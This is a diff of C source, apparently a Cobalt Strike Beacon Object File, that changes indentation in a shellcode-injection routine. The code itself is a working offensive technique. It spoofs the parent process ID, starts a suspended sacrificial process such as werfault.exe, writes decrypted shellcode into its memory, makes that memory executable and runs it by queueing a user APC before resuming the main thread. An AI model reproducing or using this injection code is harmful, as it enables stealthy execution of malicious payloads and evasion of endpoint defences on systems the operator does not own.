@@ -130,62 +130,62 @@ void go(char* args, int length) {
 
 	LPCWSTR sProcess ;
 	LPCWSTR sPArgs ;
-    STARTUPINFOEXW si = { sizeof(si) }; 
-    SIZE_T attrListSize;
-    PROCESS_INFORMATION pi ;
-    LPVOID memAddr; 
+	STARTUPINFOEXW si = { sizeof(si) }; 
+	SIZE_T attrListSize;
+	PROCESS_INFORMATION pi ;
+	LPVOID memAddr; 
 	LPVOID oldProtect;   
-    HANDLE hProcess, hThread;
-    NTSTATUS status;
-    
-    int scLen;
-    char* scPtr;
+	HANDLE hProcess, hThread;
+	NTSTATUS status;
+
+	int scLen;
+	char* scPtr;
 
 	sProcess = toMultiByte(MSVCRT$strlen(_sProcess), _sProcess, sProcess);
 	sPArgs = L"-u -p 12432 -s 23543"; //in case you using werfault.exe as a host process.
-    scLen = _encryptedDataSize;
-    scPtr = _decryptedData;
+	scLen = _encryptedDataSize;
+	scPtr = _decryptedData;
 
-    SIZE_T _scSize = sizeof(scPtr) * scLen;
-    print("[+]: SpawnTo: %ls",sProcess);
-    print("[+]: Shellcode Size: %d",scLen);
+	SIZE_T _scSize = sizeof(scPtr) * scLen;
+	print("[+]: SpawnTo: %ls",sProcess);
+	print("[+]: Shellcode Size: %d",scLen);
 
-    print("[+]: Obtaining a handle of PID %d", _ppid);
-    HANDLE pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, _ppid);
+	print("[+]: Obtaining a handle of PID %d", _ppid);
+	HANDLE pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, _ppid);
 
-    print("[+]: Spawning sacrificial process...");
+	print("[+]: Spawning sacrificial process...");
 
-    KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
-    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attrListSize);
-    KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize);
-    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
-    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
+	KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
+	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attrListSize);
+	KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize);
+	KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
+	si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 
-    if (!KERNEL32$CreateProcessW(sProcess, NULL, NULL, NULL, FALSE,
-        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi)){
-            print("[!]: CreateProcessW() Error: %d", KERNEL32$GetLastError());
+	if (!KERNEL32$CreateProcessW(sProcess, NULL, NULL, NULL, FALSE,
+	CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi)){
+	    print("[!]: CreateProcessW() Error: %d", KERNEL32$GetLastError());
 			goto _Exit;
-    }
+	}
 
-    KERNEL32$WaitForSingleObject(pi.hProcess, 2000);
-    hProcess = pi.hProcess;
-    hThread = pi.hThread;
+	KERNEL32$WaitForSingleObject(pi.hProcess, 2000);
+	hProcess = pi.hProcess;
+	hThread = pi.hThread;
 
-    memAddr = KERNEL32$VirtualAllocEx(hProcess, NULL, _scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	memAddr = KERNEL32$VirtualAllocEx(hProcess, NULL, _scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    print("[+]: Writing shellcode into remote process...");
-    KERNEL32$WriteProcessMemory(hProcess, memAddr, scPtr, _scSize, NULL);
+	print("[+]: Writing shellcode into remote process...");
+	KERNEL32$WriteProcessMemory(hProcess, memAddr, scPtr, _scSize, NULL);
 
 	KERNEL32$VirtualProtectEx(hProcess, memAddr, _scSize, PAGE_EXECUTE_READ, oldProtect);
 
-    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)memAddr;
+	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)memAddr;
 
-    print("[+]: Queueing a User APC and Resuming the main thread");
-    KERNEL32$QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);
+	print("[+]: Queueing a User APC and Resuming the main thread");
+	KERNEL32$QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);
 
-    KERNEL32$ResumeThread(hThread);
+	KERNEL32$ResumeThread(hThread);
 
-    BeaconCleanupProcess(&pi);
+	BeaconCleanupProcess(&pi);
 
 		
 	print("[*]: Done.");
